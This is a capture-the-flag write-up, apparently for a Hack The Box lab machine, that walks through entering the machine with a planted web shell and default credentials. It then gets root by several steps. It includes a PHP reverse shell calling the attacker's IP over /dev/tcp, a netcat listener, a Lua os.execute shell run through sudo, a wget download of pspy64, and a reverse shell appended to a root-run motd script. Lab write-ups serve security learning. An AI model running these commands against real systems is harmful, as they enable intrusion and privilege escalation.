Xh4H (the box creator) with a hint : Some of the best web shells that you might need,
searching for : Xh4H web shells , i found a tweet that lead to a list of reverse shell created by this user.

BY trying each one with the box url , smevk.php works
go to: http://10.10.10.181/smevk.php
it’s a login page, trying defaut creds (admin:admin) allowed me to login

Getting first shell

There is a browse option , also i know that php files are supported (the shell was in .php extension,also you can know from the site info)
so let’s uplaod a simple php reverse shell

1
2
3

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.81/1234 0>&1'");
?>

save it as rev.php and browse for it then click on the >> symbol to upload the shell
now rev.php appear into the file manager.

In your kali , listen to the 1234 port (don’t forget to change the ip and port in the rev.php)

1

rlwrap nc -vlp 1234

Note: apt install rlwrap just to make the shell more stable.

To excute the reverse shell and get connection back,just visit http://10.10.10.181/rev.php
I got a connection back

Own user

First, update to full shell using python,

1

python -c 'import pty;pty.spawn("/bin/bash")'

it’s a message from the sysadmin user , look like i can use a tool to excute a lua code ,
if i run sudo -l i can see that webadmin can run command as sysadmin without password.

After searching for how to excute system command using lua,i was able to find a simple way to excute lua command,
create a lua command shell :

1

echo "local t = os.execute('/bin/sh')" > rev.lua

execute rev.lua as sysadmin without password to get user:

1

sudo -u sysadmin /home/sysadmin/luvit rev.lua

i am in a linux box , also i have ssh service running so it’s better to get ssh shell…

command : ssh-keygen then get your public id key : cat ~/.ssh/id_rsa.pub

Own root

Setup your webserver to host pspy64 and upload it to the box
command that i used for upload : wget http://10.10.16.81/pspy64
i can see a command running as root (UID=0):


The system copies the files in /var/backups/.update-motd.d/ to /etc/update-motd.d/ every 30 seconds.
After a while , i noticed that is excuted on every ssh login ,and the command in 00-header will be excuted as root.
i added a bash rev shell to 00-header:

1

echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.81/4444 0>&1'" >> /etc/update-motd.d/00-header


listen on port 4444 and ssh to the box from another terminal

Note: you have to ssh from another terminal within 30 seconds after you add the rev shell to the 00-header

Finally i got root :) . Your feedback is appreciated !
